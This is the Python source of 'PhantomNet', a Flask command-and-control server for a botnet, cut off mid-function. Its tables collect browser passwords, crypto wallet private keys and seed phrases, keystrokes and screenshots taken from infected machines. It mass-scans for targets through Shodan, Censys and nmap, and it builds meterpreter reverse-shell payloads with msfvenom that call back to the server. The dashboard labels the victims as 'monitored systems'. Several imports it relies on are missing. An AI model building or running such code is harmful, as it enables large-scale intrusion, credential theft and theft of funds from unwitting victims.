#!/usr/bin/env python3

import os
import json
import time
import secrets
import logging
import requests
import threading
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any

from flask import Flask, request, jsonify, render_template, redirect, url_for, session, flash
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash

# Configure logging for Ubuntu 24.04 server environment
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('phantom.log'),
        logging.StreamHandler()
    ]
)

# Flask app setup for Ubuntu 24.04 VPS
app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(32)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///phantom_c2.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Database Models
class Admin(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(120), nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    is_active = db.Column(db.Boolean, default=True)

class Bot(db.Model):
    id = db.Column(db.String(50), primary_key=True)
    ip_address = db.Column(db.String(45))
    hostname = db.Column(db.String(100))
    os_info = db.Column(db.String(100))
    username = db.Column(db.String(100))
    registered_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_seen = db.Column(db.DateTime)
    status = db.Column(db.String(20), default='active')
    capabilities = db.Column(db.Text)  # JSON string
    session_token = db.Column(db.String(100))

class Command(db.Model):
    id = db.Column(db.String(50), primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    command = db.Column(db.Text, nullable=False)
    args = db.Column(db.Text)  # JSON string
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    status = db.Column(db.String(20), default='pending')
    result = db.Column(db.Text)

class SystemInfo(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    system_data = db.Column(db.Text)  # JSON string
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class NetworkScan(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    scan_data = db.Column(db.Text)  # JSON string
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class ProcessList(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    process_data = db.Column(db.Text)  # JSON string
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class FileSystem(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    path = db.Column(db.String(500))
    file_data = db.Column(db.Text)  # JSON string
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class RegistryData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    registry_data = db.Column(db.Text)  # JSON string
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class Screenshot(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    screenshot_data = db.Column(db.Text)  # Base64 encoded image
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class KeyloggerData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    keystroke_data = db.Column(db.Text)  # JSON string
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

# CHROMIUM LOGIN STEALER - Stores credentials harvested from Chromium-based browsers
class ChromiumCredentials(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    url = db.Column(db.String(500))
    username = db.Column(db.String(200))
    password = db.Column(db.String(200))
    browser = db.Column(db.String(50))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

# CRYPTO WALLET STEALER - Stores cryptocurrency wallet data
class CryptoWallet(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    wallet_name = db.Column(db.String(50))
    wallet_path = db.Column(db.String(500))
    wallet_data = db.Column(db.Text)  # JSON string of wallet contents
    private_key = db.Column(db.String(500))
    mnemonic_phrase = db.Column(db.String(500))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class DuckDNSUpdater(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    domain = db.Column(db.String(100), nullable=False)
    token = db.Column(db.String(100), nullable=False)
    last_update = db.Column(db.DateTime)
    is_active = db.Column(db.Boolean, default=True)

# Add advanced C2 models after existing models
class Payload(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    payload_type = db.Column(db.String(50))  # exe, dll, shellcode, etc.
    platform = db.Column(db.String(20))  # windows, linux, macos
    architecture = db.Column(db.String(10))  # x86, x64
    payload_data = db.Column(db.LargeBinary)  # Binary payload
    encryption_key = db.Column(db.String(100))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    is_active = db.Column(db.Boolean, default=True)

class Target(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip_address = db.Column(db.String(45))
    hostname = db.Column(db.String(100))
    os_info = db.Column(db.String(100))
    open_ports = db.Column(db.Text)  # JSON string
    vulnerabilities = db.Column(db.Text)  # JSON string
    services = db.Column(db.Text)  # JSON string
    discovered_at = db.Column(db.DateTime, default=datetime.utcnow)
    status = db.Column(db.String(20), default='discovered')  # discovered, exploited, failed
    exploitation_method = db.Column(db.String(50))
    notes = db.Column(db.Text)

class Campaign(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    description = db.Column(db.Text)
    payload_id = db.Column(db.Integer, db.ForeignKey('payload.id'))
    target_criteria = db.Column(db.Text)  # JSON string
    status = db.Column(db.String(20), default='active')  # active, paused, completed
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    targets_discovered = db.Column(db.Integer, default=0)
    targets_exploited = db.Column(db.Integer, default=0)
    success_rate = db.Column(db.Float, default=0.0)

class Exploit(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    exploit_type = db.Column(db.String(50))  # rce, lfi, sqli, etc.
    target_platform = db.Column(db.String(20))
    cve_id = db.Column(db.String(20))
    exploit_code = db.Column(db.Text)
    success_rate = db.Column(db.Float, default=0.0)
    is_active = db.Column(db.Boolean, default=True)

class Task(db.Model):
    id = db.Column(db.String(50), primary_key=True)
    bot_id = db.Column(db.String(50), db.ForeignKey('bot.id'), nullable=False)
    task_type = db.Column(db.String(50))  # execute, download, upload, scan, etc.
    command = db.Column(db.Text, nullable=False)
    args = db.Column(db.Text)  # JSON string
    payload_id = db.Column(db.Integer, db.ForeignKey('payload.id'))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    status = db.Column(db.String(20), default='pending')  # pending, running, completed, failed
    result = db.Column(db.Text)
    execution_time = db.Column(db.Float)  # seconds
    output = db.Column(db.Text)  # command output
    error = db.Column(db.Text)  # error message if failed

# Create database tables
with app.app_context():
    db.create_all()
    
    # Create default admin if not exists
    if not Admin.query.filter_by(username='admin').first():
        admin = Admin(
            username='admin',
            password_hash=generate_password_hash('phantom_admin_2024'),
            email='admin@phantomnet.com'
        )
        db.session.add(admin)
        db.session.commit()

    # Initialize DuckDNS configuration
    if not DuckDNSUpdater.query.first():
        duckdns = DuckDNSUpdater(
            domain='your-domain',
            token='your-token',
            is_active=False
        )
        db.session.add(duckdns)
        db.session.commit()

class PhantomC2Server:
    def __init__(self, host='0.0.0.0', port=8443):
        self.host = host
        self.port = port
        self.bots: Dict[str, Bot] = {}
        self.commands: Dict[str, Command] = {}
        self.master_key = secrets.token_urlsafe(32)
        self.session_tokens = {}
        self.active_campaigns = {}
        self.exploit_modules = {}
        self.target_discovery = TargetDiscovery()
        self.payload_generator = PayloadGenerator()
        self.threat_intelligence = ThreatIntelligence()

    def generate_session_token(self, bot_id: str) -> str:
        """Generate secure session token for bot"""
        token = secrets.token_urlsafe(32)
        expires = datetime.now() + timedelta(hours=24)
        return token

    def verify_session_token(self, token: str) -> Optional[str]:
        """Verify session token and return bot_id if valid"""
        bot = Bot.query.filter_by(session_token=token).first()
        if bot and bot.last_seen and (datetime.now() - bot.last_seen).seconds < 86400:
            return bot.id
        return None

    def update_duckdns(self):
        """Update DuckDNS domain with current IP"""
        try:
            duckdns_config = DuckDNSUpdater.query.filter_by(is_active=True).first()
            if not duckdns_config:
                return False
            
            # Get current public IP
            ip_response = requests.get('https://api.ipify.org?format=json')
            current_ip = ip_response.json()['ip']
            
            # Update DuckDNS
            update_url = f"https://www.duckdns.org/update?domains={duckdns_config.domain}&token={duckdns_config.token}&ip={current_ip}"
            response = requests.get(update_url)
            
            if response.text == 'OK':
                duckdns_config.last_update = datetime.now()
                db.session.commit()
                logging.info(f"DuckDNS updated successfully: {duckdns_config.domain} -> {current_ip}")
                return True
            else:
                logging.error(f"DuckDNS update failed: {response.text}")
                return False
                
        except Exception as e:
            logging.error(f"DuckDNS update error: {e}")
            return False

# Advanced C2 Classes
class TargetDiscovery:
    def __init__(self):
        self.discovery_methods = [
            self.scan_shodan,
            self.scan_censys,
            self.scan_network,
            self.scan_dns
        ]
    
    def discover_targets(self, criteria):
        targets = []
        for method in self.discovery_methods:
            try:
                method_targets = method(criteria)
                targets.extend(method_targets)
            except Exception as e:
                logging.error(f"Discovery method failed: {e}")
        return list(set(targets))
    
    def scan_shodan(self, criteria):
        """Scan Shodan API for targets matching criteria"""
        targets = []
        try:
            api_key = os.getenv('SHODAN_API_KEY')
            if not api_key:
                logging.error("Shodan API key not configured")
                return targets
                
            query = criteria.get('query', 'product:"Apache httpd"')
            page = criteria.get('page', 1)
            
            response = requests.get(
                f'https://api.shodan.io/shodan/host/search?key={api_key}&query={query}&page={page}'
            )
            
            if response.status_code == 200:
                results = response.json()
                for result in results.get('matches', []):
                    targets.append({
                        'ip': result.get('ip_str'),
                        'hostname': result.get('hostnames', [''])[0] if result.get('hostnames') else '',
                        'os_info': result.get('os', 'Unknown'),
                        'open_ports': [service.get('port') for service in result.get('data', [])],
                        'services': result.get('data', [])
                    })
        except Exception as e:
            logging.error(f"Shodan scan failed: {e}")
        return targets
    
    def scan_censys(self, criteria):
        """Scan Censys API for targets matching criteria"""
        targets = []
        try:
            api_id = os.getenv('CENSYS_API_ID')
            api_secret = os.getenv('CENSYS_API_SECRET')
            if not api_id or not api_secret:
                logging.error("Censys API credentials not configured")
                return targets
                
            query = criteria.get('query', 'services.service_name: HTTP')
            page = criteria.get('page', 1)
            
            auth = (api_id, api_secret)
            response = requests.post(
                'https://search.censys.io/api/v2/hosts/search',
                auth=auth,
                json={
                    'q': query,
                    'per_page': 50,
                    'page': page
                }
            )
            
            if response.status_code == 200:
                results = response.json()
                for hit in results.get('result', {}).get('hits', []):
                    targets.append({
                        'ip': hit.get('ip'),
                        'hostname': hit.get('names', [''])[0] if hit.get('names') else '',
                        'os_info': hit.get('operating_system', 'Unknown'),
                        'open_ports': [service.get('port') for service in hit.get('services', [])],
                        'services': hit.get('services', [])
                    })
        except Exception as e:
            logging.error(f"Censys scan failed: {e}")
        return targets
    
    def scan_network(self, criteria):
        """Perform network scan using nmap"""
        targets = []
        try:
            network = criteria.get('network', '192.168.1.0/24')
            ports = criteria.get('ports', '22,80,443')
            
            # Check if nmap is installed
            if shutil.which('nmap') is None:
                logging.error("nmap not installed on server")
                return targets
                
            # Run nmap scan
            cmd = ['nmap', '-sS', '-p', ports, '-oX', '-', network]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Parse XML output (simplified)
                # In a real implementation, you'd use an XML parser
                ip_pattern = r'<address addr="([\d.]+)" addrtype="ipv4"></address>'
                hostname_pattern = r'<hostname name="([^"]+)"'
                port_pattern = r'<port protocol="tcp" portid="(\d+)"><state state="open"/>'
                
                ips = re.findall(ip_pattern, result.stdout)
                hostnames = re.findall(hostname_pattern, result.stdout)
                open_ports = re.findall(port_pattern, result.stdout)
                
                # Process results
                for ip in ips:
                    targets.append({
                        'ip': ip,
                        'hostname': hostnames[ips.index(ip)] if ips.index(ip) < len(hostnames) else '',
                        'os_info': 'Unknown',
                        'open_ports': list(set(open_ports)),
                        'services': []
                    })
        except Exception as e:
            logging.error(f"Network scan failed: {e}")
        return targets
    
    def scan_dns(self, criteria):
        """Perform DNS enumeration"""
        targets = []
        try:
            domain = criteria.get('domain', 'example.com')
            wordlist = criteria.get('wordlist', '/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt')
            
            # Check if wordlist exists
            if not os.path.exists(wordlist):
                logging.error(f"Wordlist not found: {wordlist}")
                return targets
                
            # Read wordlist
            with open(wordlist, 'r') as f:
                subdomains = [line.strip() for line in f.readlines()[:100]]  # Limit to first 100 for speed
            
            # Perform DNS lookups
            for subdomain in subdomains:
                fqdn = f"{subdomain}.{domain}"
                try:
                    ip = socket.gethostbyname(fqdn)
                    targets.append({
                        'ip': ip,
                        'hostname': fqdn,
                        'os_info': 'Unknown',
                        'open_ports': [],
                        'services': []
                    })
                except:
                    pass
        except Exception as e:
            logging.error(f"DNS scan failed: {e}")
        return targets

class PayloadGenerator:
    def __init__(self):
        self.payload_templates = {
            'windows': self.generate_windows_payload,
            'linux': self.generate_linux_payload,
            'macos': self.generate_macos_payload
        }
    
    def generate_payload(self, platform, architecture, payload_type='exe'):
        if platform in self.payload_templates:
            return self.payload_templates[platform](architecture, payload_type)
        return None
    
    def generate_windows_payload(self, architecture, payload_type):
        """Generate Windows payload with msfvenom"""
        try:
            lhost = os.getenv('C2_SERVER_IP', '127.0.0.1')
            lport = os.getenv('C2_SERVER_PORT', '8443')
            
            if payload_type == 'exe':
                cmd = [
                    'msfvenom',
                    '-p', f'windows/{architecture}/meterpreter/reverse_tcp',
                    f'LHOST={lhost}',
                    f'LPORT={lport}',
                    '-f', 'exe'
                ]
                result = subprocess.run(cmd, capture_output=True)
                if result.returncode == 0:
                    return {
                        'data': result.stdout,
                        'type': payload_type,
                        'platform': 'windows',
                        'architecture': architecture
                    }
            elif payload_type == 'dll':
                cmd = [
                    'msfvenom',
                    '-p', f'windows/{architecture}/meterpreter/reverse_tcp',
                    f'LHOST={lhost}',
                    f'LPORT={lport}',
                    '-f', 'dll'
                ]
                result = subprocess.run(cmd, capture_output=True)
                if result.returncode == 0:
                    return {
                        'data': result.stdout,
                        'type': payload_type,
                        'platform': 'windows',
                        'architecture': architecture
                    }
        except Exception as e:
            logging.error(f"Windows payload generation failed: {e}")
        
        return {
            'data': b'# Windows payload data would be generated here',
            'type': payload_type,
            'platform': 'windows',
            'architecture': architecture
        }
    
    def generate_linux_payload(self, architecture, payload_type):
        """Generate Linux payload with msfvenom"""
        try:
            lhost = os.getenv('C2_SERVER_IP', '127.0.0.1')
            lport = os.getenv('C2_SERVER_PORT', '8443')
            
            if payload_type == 'elf':
                cmd = [
                    'msfvenom',
                    '-p', f'linux/{architecture}/meterpreter/reverse_tcp',
                    f'LHOST={lhost}',
                    f'LPORT={lport}',
                    '-f', 'elf'
                ]
                result = subprocess.run(cmd, capture_output=True)
                if result.returncode == 0:
                    return {
                        'data': result.stdout,
                        'type': payload_type,
                        'platform': 'linux',
                        'architecture': architecture
                    }
            elif payload_type == 'sh':
                cmd = [
                    'msfvenom',
                    '-p', 'cmd/unix/reverse_python',
                    f'LHOST={lhost}',
                    f'LPORT={lport}',
                    '-f', 'raw'
                ]
                result = subprocess.run(cmd, capture_output=True)
                if result.returncode == 0:
                    return {
                        'data': result.stdout,
                        'type': payload_type,
                        'platform': 'linux',
                        'architecture': architecture
                    }
        except Exception as e:
            logging.error(f"Linux payload generation failed: {e}")
        
        return {
            'data': b'# Linux payload data would be generated here',
            'type': payload_type,
            'platform': 'linux',
            'architecture': architecture
        }
    
    def generate_macos_payload(self, architecture, payload_type):
        """Generate macOS payload with msfvenom"""
        try:
            lhost = os.getenv('C2_SERVER_IP', '127.0.0.1')
            lport = os.getenv('C2_SERVER_PORT', '8443')
            
            if payload_type == 'macho':
                cmd = [
                    'msfvenom',
                    '-p', f'osx/{architecture}/meterpreter/reverse_tcp',
                    f'LHOST={lhost}',
                    f'LPORT={lport}',
                    '-f', 'macho'
                ]
                result = subprocess.run(cmd, capture_output=True)
                if result.returncode == 0:
                    return {
                        'data': result.stdout,
                        'type': payload_type,
                        'platform': 'macos',
                        'architecture': architecture
                    }
        except Exception as e:
            logging.error(f"macOS payload generation failed: {e}")
        
        return {
            'data': b'# macOS payload data would be generated here',
            'type': payload_type,
            'platform': 'macos',
            'architecture': architecture
        }

class ThreatIntelligence:
    def __init__(self):
        self.intel_sources = [
            'virustotal',
            'abuseipdb',
            'alienvault'
        ]
    
    def check_target_reputation(self, target_ip):
        reputation_score = 0
        for source in self.intel_sources:
            try:
                score = self._check_source(source, target_ip)
                reputation_score += score
            except Exception as e:
                logging.error(f"Intel source failed: {e}")
        return reputation_score / len(self.intel_sources) if self.intel_sources else 0
    
    def _check_source(self, source, target_ip):
        """Check target IP against threat intelligence sources"""
        try:
            if source == 'virustotal':
                api_key = os.getenv('VIRUSTOTAL_API_KEY')
                if not api_key:
                    return 0.5
                    
                headers = {'x-apikey': api_key}
                response = requests.get(
                    f'https://www.virustotal.com/api/v3/ip_addresses/{target_ip}',
                    headers=headers
                )
                
                if response.status_code == 200:
                    data = response.json()
                    malicious = data.get('data', {}).get('attributes', {}).get('last_analysis_stats', {}).get('malicious', 0)
                    total = sum(data.get('data', {}).get('attributes', {}).get('last_analysis_stats', {}).values())
                    return malicious / total if total > 0 else 0.0
                return 0.5
                
            elif source == 'abuseipdb':
                api_key = os.getenv('ABUSEIPDB_API_KEY')
                if not api_key:
                    return 0.5
                    
                params = {
                    'ipAddress': target_ip,
                    'maxAgeInDays': 90
                }
                headers = {'Key': api_key}
                response = requests.get(
                    'https://api.abuseipdb.com/api/v2/check',
                    params=params,
                    headers=headers
                )
                
                if response.status_code == 200:
                    data = response.json()
                    return data.get('data', {}).get('abuseConfidenceScore', 50) / 100.0
                return 0.5
                
            elif source == 'alienvault':
                api_key = os.getenv('OTX_API_KEY')
                if not api_key:
                    return 0.5
                    
                headers = {'X-OTX-API-KEY': api_key}
                response = requests.get(
                    f'https://otx.alienvault.com/api/v1/indicators/IPv4/{target_ip}/general',
                    headers=headers
                )
                
                if response.status_code == 200:
                    data = response.json()
                    pulses = data.get('pulse_info', {}).get('count', 0)
                    return min(pulses / 10, 1.0)  # Cap at 1.0
                return 0.5
                
        except Exception as e:
            logging.error(f"Threat intelligence check failed: {e}")
            return 0.5
            
        return 0.5

# Global server instance
server = PhantomC2Server()

# Routes
@app.route('/')
def index():
    if 'admin_logged_in' in session:
        return redirect(url_for('admin_dashboard'))
    return redirect(url_for('admin_login'))

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        admin = Admin.query.filter_by(username=username).first()
        if admin and check_password_hash(admin.password_hash, password):
            session['admin_logged_in'] = True
            session['admin_id'] = admin.id
            return redirect(url_for('admin_dashboard'))
        else:
            flash('Invalid credentials', 'error')
    
    return render_template('admin/login.html')

@app.route('/admin/dashboard')
def admin_dashboard():
    if 'admin_logged_in' not in session:
        return redirect(url_for('admin_login'))
    
    # Get statistics
    total_bots = Bot.query.count()
    active_bots = Bot.query.filter_by(status='active').count()
    recent_commands = Command.query.order_by(Command.timestamp.desc()).limit(10).all()
    total_targets = Target.query.count()
    total_campaigns = Campaign.query.count()
    total_payloads = Payload.query.count()
    total_tasks = Task.query.count()
    completed_tasks = Task.query.filter_by(status='completed').count()
    failed_tasks = Task.query.filter_by(status='failed').count()
    
    # Get all bots for the dashboard
    bots = Bot.query.order_by(Bot.last_seen.desc()).all()
    
    # Get latest data for each bot
    bot_data = {}
    for bot in bots:
        system_info = SystemInfo.query.filter_by(bot_id=bot.id).order_by(SystemInfo.timestamp.desc()).first()
        network_scan = NetworkScan.query.filter_by(bot_id=bot.id).order_by(NetworkScan.timestamp.desc()).first()
        process_list = ProcessList.query.filter_by(bot_id=bot.id).order_by(ProcessList.timestamp.desc()).first()
        file_system = FileSystem.query.filter_by(bot_id=bot.id).order_by(FileSystem.timestamp.desc()).first()
        registry_data = RegistryData.query.filter_by(bot_id=bot.id).order_by(RegistryData.timestamp.desc()).first()
        screenshots = Screenshot.query.filter_by(bot_id=bot.id).order_by(Screenshot.timestamp.desc()).limit(5).all()
        keylogger_data = KeyloggerData.query.filter_by(bot_id=bot.id).order_by(KeyloggerData.timestamp.desc()).limit(5).all()
        chromium_credentials = ChromiumCredentials.query.filter_by(bot_id=bot.id).order_by(ChromiumCredentials.timestamp.desc()).limit(5).all()
        crypto_wallets = CryptoWallet.query.filter_by(bot_id=bot.id).order_by(CryptoWallet.timestamp.desc()).limit(5).all()
        
        bot_data[bot.id] = {
            'system_info': system_info,
            'network_scan': network_scan,
            'process_list': process_list,
            'file_system': file_system,
            'registry_data': registry_data,
            'screenshots': screenshots,
            'keylogger_data': keylogger_data,
            'chromium_credentials': chromium_credentials,
            'crypto_wallets': crypto_wallets
        }
    
    # DuckDNS configuration
    duckdns_config = DuckDNSUpdater.query.first()
    
    # Get advanced C2 data
    targets = Target.query.order_by(Target.discovered_at.desc()).limit(10).all()
    campaigns = Campaign.query.order_by(Campaign.created_at.desc()).limit(5).all()
    payloads = Payload.query.order_by(Payload.created_at.desc()).limit(5).all()
    recent_tasks = Task.query.order_by(Task.created_at.desc()).limit(10).all()
    
    # Generate comprehensive HTML dashboard
    html = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>PhantomNet Admin Dashboard</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
        <style>
            .sidebar {{
                min-height: 100vh;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            }}
            .sidebar .nav-link {{
                color: rgba(255,255,255,0.8);
                padding: 12px 20px;
                margin: 2px 0;
                border-radius: 8px;
                transition: all 0.3s ease;
            }}
            .sidebar .nav-link:hover, .sidebar .nav-link.active {{
                color: white;
                background: rgba(255,255,255,0.1);
                transform: translateX(5px);
            }}
            .main-content {{
                background: #f8f9fa;
                min-height: 100vh;
            }}
            .card {{
                border: none;
                border-radius: 15px;
                box-shadow: 0 4px 6px rgba(0,0,0,0.1);
                transition: transform 0.3s ease;
            }}
            .card:hover {{
                transform: translateY(-5px);
            }}
            .stat-card {{
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
            }}
            .stat-card .icon {{
                font-size: 2.5rem;
                opacity: 0.8;
            }}
            .feature-section {{
                background: white;
                border-radius: 15px;
                padding: 25px;
                margin-bottom: 20px;
                box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            }}
            .feature-icon {{
                width: 60px;
                height: 60px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                color: white;
                font-size: 1.5rem;
                margin-bottom: 15px;
            }}
            .bot-card {{
                background: white;
                border-radius: 10px;
                padding: 20px;
                margin-bottom: 20px;
                border-left: 4px solid #667eea;
            }}
            .data-section {{
                background: #f8f9fa;
                border-radius: 8px;
                padding: 15px;
                margin-top: 15px;
            }}
            .progress-custom {{
                height: 8px;
                border-radius: 4px;
                background: #e9ecef;
            }}
            .progress-custom .progress-bar {{
                border-radius: 4px;
            }}
            .screenshot-img {{
                max-width: 100%;
                border-radius: 8px;
                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
                cursor: pointer;
            }}
            .keystroke-data {{
                background: white;
                border-radius: 8px;
                padding: 10px;
                font-family: 'Courier New', monospace;
                font-size: 0.9rem;
                max-height: 200px;
                overflow-y: auto;
            }}
            .credential-entry {{
                background: #f8f9fa;
                border-radius: 4px;
                padding: 8px;
                margin-bottom: 5px;
                border-left: 3px solid #667eea;
            }}
            .wallet-entry {{
                background: #f8f9fa;
                border-radius: 4px;
                padding: 8px;
                margin-bottom: 5px;
                border-left: 3px solid #764ba2;
            }}
        </style>
    </head>
    <body>
        <div class="container-fluid">
            <div class="row">
                
                <div class="col-md-3 col-lg-2 sidebar p-0">
                    <div class="p-4">
                        <h4 class="text-white mb-4">
                            <i class="fas fa-ghost me-2"></i>
                            PhantomNet
                        </h4>
                        <nav class="nav flex-column">
                            <a class="nav-link active" href="#dashboard">
                                <i class="fas fa-tachometer-alt me-2"></i>
                                Dashboard
                            </a>
                            <a class="nav-link" href="#systems">
                                <i class="fas fa-robot me-2"></i>
                                Connected Systems
                            </a>
                            <a class="nav-link" href="#duckdns">
                                <i class="fas fa-globe me-2"></i>
                                DuckDNS Configuration
                            </a>
                            <hr class="text-white-50">
                            <a class="nav-link" href="/admin/logout">
                                <i class="fas fa-sign-out-alt me-2"></i>
                                Logout
                            </a>
                        </nav>
                    </div>
                </div>

                
                <div class="col-md-9 col-lg-10 main-content p-4">
                    <div class="d-flex justify-content-between align-items-center mb-4">
                        <h2><i class="fas fa-tachometer-alt me-2"></i>System Monitoring Dashboard</h2>
                        <span class="text-muted">{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</span>
                    </div>

                    
                    <div class="row mb-4">
                        <div class="col-md-4">
                            <div class="card stat-card">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between">
                                        <div>
                                            <h3 class="mb-0">{total_bots}</h3>
                                            <p class="mb-0">Total Systems</p>
                                        </div>
                                        <div class="icon">
                                            <i class="fas fa-robot"></i>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div class="card stat-card">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between">
                                        <div>
                                            <h3 class="mb-0">{active_bots}</h3>
                                            <p class="mb-0">Active Systems</p>
                                        </div>
                                        <div class="icon">
                                            <i class="fas fa-wifi"></i>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card stat-card">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between">
                                        <div>
                                            <h3 class="mb-0">{len(recent_commands)}</h3>
                                            <p class="mb-0">Recent Commands</p>
                                        </div>
                                        <div class="icon">
                                            <i class="fas fa-terminal"></i>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card stat-card">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between">
                                        <div>
                                            <h3 class="mb-0">{total_targets}</h3>
                                            <p class="mb-0">Discovered Targets</p>
                                        </div>
                                        <div class="icon">
                                            <i class="fas fa-crosshairs"></i>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card stat-card">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between">
                                        <div>
                                            <h3 class="mb-0">{total_campaigns}</h3>
                                            <p class="mb-0">Active Campaigns</p>
                                        </div>
                                        <div class="icon">
                                            <i class="fas fa-rocket"></i>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card stat-card">
                                <div class="card-body">
                                    <div class="d-flex justify-content-between">
                                        <div>
                                            <h3 class="mb-0">{total_payloads}</h3>
                                            <p class="mb-0">Generated Payloads</p>
                                        </div>
                                        <div class="icon">
                                            <i class="fas fa-bomb"></i>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    
                    <div id="systems" class="mb-5">
                        <h3 class="mb-4"><i class="fas fa-robot me-2"></i>Connected Systems</h3>
                        {_generate_bots_section(bots, bot_data)}
                    </div>

                    
                    <div id="c2-operations" class="mb-5">
                        <h3 class="mb-4"><i class="fas fa-crosshairs me-2"></i>Advanced C2 Operations</h3>
                        {_generate_c2_operations_section(targets, campaigns, payloads, recent_tasks)}
                    </div>

                    
                    <div id="duckdns" class="mb-5">
                        <h3 class="mb-4"><i class="fas fa-globe me-2"></i>DuckDNS Configuration</h3>
                        {_generate_duckdns_section(duckdns_config)}
                    </div>

                    
                    {_generate_recent_commands_section(recent_commands)}
                </div>
            </div>
        </div>

        
        <div class="modal fade" id="imageModal" tabindex="-1">
            <div class="modal-dialog modal-xl">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title">Image View</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                    </div>
                    <div class="modal-body text-center">
                        <img id="modalImage" src="" class="img-fluid" alt="Image">
                    </div>
                </div>
            </div>
        </div>

        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
        <script>
            function openImage(src) {{
                document.getElementById('modalImage').src = src;
                new bootstrap.Modal(document.getElementById('imageModal')).show();
            }}
            
            // Auto-refresh dashboard every 30 seconds
            setTimeout(function() {{
                location.reload();
            }}, 30000);
        </script>
    </body>
    </html>
    """
    
    return html

def _generate_bots_section(bots, bot_data):
    """Generate HTML for bots section"""
    if not bots:
        return """
        <div class="text-center py-5">
            <i class="fas fa-robot fa-3x text-muted mb-3"></i>
            <h4 class="text-muted">No Systems Connected</h4>
            <p class="text-muted">No systems are currently connected to the monitoring platform.</p>
        </div>
        """
    
    html = ""
